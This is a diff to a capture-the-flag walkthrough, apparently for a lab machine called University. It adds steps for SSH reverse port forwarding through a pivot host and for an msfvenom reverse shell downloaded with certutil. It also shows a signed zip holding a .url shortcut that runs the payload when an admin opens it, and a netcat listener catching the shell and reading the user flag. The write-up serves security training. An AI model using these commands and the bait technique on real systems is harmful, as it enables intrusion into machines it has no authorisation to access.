@@ -1,3 +1,9 @@
+> [!Note]
+>
+> |User|Root|
+> |---|---|
+> |✅|❌|
+
 ![image](https://github.com/user-attachments/assets/9d5ed6d1-39f1-4b0c-a85c-b3e794e4048c)
 
 ## 1. Recon
@@ -850,7 +856,7 @@ root@kali:~# gpg --export -a george > george.asc
 
 ![image](https://github.com/user-attachments/assets/43d3c850-5cfb-45ad-a15b-f80c22b423a5)
 
-### 5.3. Getting a Shell
+### 5.3. Preparing payload
 
 The `Manage My Courses` page shows the list of courses under the account:
 
@@ -863,9 +869,51 @@ Selecting `Learn More` on a course leads to `Add a new lecture`:
 This is very likely to be a "client-side" attack where an admin would open the attachment to inspect it
 1. The target `WS-3` was found previously, where `wao` has user-level access to
 2. The admin would probably be inspecting the attachment from `WS-3`, guessing that `WS` would mean "workstation"
-3. `WS-3` is in the `192.168.99.12` subnet, which will likely not have connectivity to Kali → so the reverse shell listener should run on `LAB-2`
+3. `WS-3` is in the `192.168.99.12` subnet, which will likely not have connectivity to Kali → `LAB-2` would need to be a port proxy to Kali
 
-#### 5.3.1. Generate a reverse shell executable that points to `LAB-2`
+#### 5.3.1. Establish reverse port forwarding from Kali to `LAB-2`
+
+Prepare `LAB-2` for reverse port forwarding
+
+```console
+wao@LAB-2:~$ sudo sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
+[sudo] password for wao:
+wao@LAB-2:~$ sudo systemctl restart sshd
+```
+
+SSH from Kali to `LAB-2` to create the reverse tunnel:
+- `0.0.0.0:8080:10.10.14.35:80` for payload download
+- `0.0.0.0:4444:10.10.14.35:4444` for reverse shell connection
+
+```console
+root@kali:~# proxychains -q ssh -R 0.0.0.0:8080:10.10.14.35:80  -R 0.0.0.0:4444:10.10.14.35:4444 wao@192.168.99.12
+--------------------------[!]WARNING[!]-----------------------------
+|This LAB is created for web app features testing purposes ONLY....|
+|Please DO NOT leave any critical information while this machine is|
+|       accessible by all the "Web Developers" as sudo users       |
+--------------------------------------------------------------------
+wao@192.168.99.12's password:
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Dec 28 12:16:43 2024 from 192.168.99.1
+wao@LAB-2:~$ ss -plntu
+Netid                  State                    Recv-Q                   Send-Q                                      Local Address:Port                                     Peer Address:Port
+udp                    UNCONN                   0                        0                                           127.0.0.53%lo:53                                            0.0.0.0:*
+tcp                    LISTEN                   0                        128                                               0.0.0.0:8080                                          0.0.0.0:*
+tcp                    LISTEN                   0                        128                                         127.0.0.53%lo:53                                            0.0.0.0:*
+tcp                    LISTEN                   0                        128                                               0.0.0.0:22                                            0.0.0.0:*
+tcp                    LISTEN                   0                        128                                               0.0.0.0:4444                                          0.0.0.0:*
+tcp                    LISTEN                   0                        128                                                  [::]:8080                                             [::]:*
+tcp                    LISTEN                   0                        128                                                  [::]:22                                               [::]:*
+tcp                    LISTEN                   0                        128                                                  [::]:4444                                             [::]:*
+```
+
+#### 5.3.2. Generate a reverse shell executable that points to `LAB-2`
 
 ```console
 root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=4444 -f exe -o /var/www/html/reverse.exe
@@ -877,10 +925,169 @@ Final size of exe file: 7168 bytes
 Saved as: /var/www/html/reverse.exe
 ```
 
-#### 5.3.2. Place the payload with the user-level access that `wao` has on `WS-3`
+#### 5.3.3. Place the payload with the user-level access that `wao` has on `WS-3`
+
+Stage a directory to place the payload where other users can read
 
 ```pwsh
+PS C:\Users\wao\Documents> mkdir C:\temp
 
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       12/28/2024   8:50 AM                temp
+
+
+PS C:\Users\wao\Documents> icacls C:\temp /grant "Everyone:(OI)(CI)F"
+processed file: C:\temp
+Successfully processed 1 files; Failed processing 0 files
 ```
 
-#### 5.3.3. 
+Download the payload to the directory
+
+```pwsh
+PS C:\Users\wao\Documents> certutil.exe -urlcache -f -split http://192.168.99.12:8080/reverse.exe C:\temp\reverse.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\wao\Documents> icacls C:\temp\reverse.exe
+C:\temp\reverse.exe Everyone:(I)(F)
+                    NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(RX)
+                    UNIVERSITY\WAO:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+### 5.4. Getting a shell
+
+Start the listener:
+
+```console
+root@kali:~# rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Create the bait `lecture.url`:
+
+```sh
+cat << EOF > lecture.url
+[InternetShortcut]
+URL=file:///C:/temp/reverse.exe
+IDList=
+EOF
+```
+
+Zip the bait:
+
+```console
+root@kali:~# zip lecture.zip lecture.url
+  adding: lecture.url (stored 0%)
+```
+
+Sign the zip:
+
+```sh
+gpg -u george --detach-sign lecture.zip
+```
+
+Upload `` and `` to the university site:
+
+![image](https://github.com/user-attachments/assets/9d3ea654-1905-4eeb-888a-3e48dd2b0814)
+
+Wait for the shell to hook:
+
+![image](https://github.com/user-attachments/assets/cb1e9f15-976c-4e7e-995c-25fd37b728b7)
+
+The shell should hook in a minute or so:
+
+```cmd
+connect to [10.10.14.35] from (UNKNOWN) [10.10.11.39] 55945
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostname
+hostname
+WS-3
+
+C:\Windows\system32>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== =============================================
+university\martin.t S-1-5-21-2056245889-740706773-2266349663-1127
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+UNIVERSITY\Content Evaluators              Group            S-1-5-21-2056245889-740706773-2266349663-1126 Mandatory group, Enabled by default, Enabled group
+UNIVERSITY\Research & Development          Group            S-1-5-21-2056245889-740706773-2266349663-1130 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+Get the user flag:
+
+```cmd
+C:\Windows\system32>dir /S .\*user.txt
+dir /S .\*user.txt
+ Volume in drive C has no label.
+ Volume Serial Number is DA09-D830
+File Not Found
+
+C:\Windows\system32>dir /S C:\*user.txt
+dir /S C:\*user.txt
+ Volume in drive C has no label.
+ Volume Serial Number is DA09-D830
+
+ Directory of C:\Users\Martin.T\Desktop
+
+12/27/2024  11:00 PM                34 user.txt
+               1 File(s)             34 bytes
+
+     Total Files Listed:
+               1 File(s)             34 bytes
+               0 Dir(s)  10,001,006,592 bytes free
+
+C:\Windows\system32>type C:\Users\Martin.T\Desktop\user.txt
+type C:\Users\Martin.T\Desktop\user.txt
+4a88f7b1cb941e56a60b1ceb062cea6f
+```
+
+## 6. Privilege escalation
+
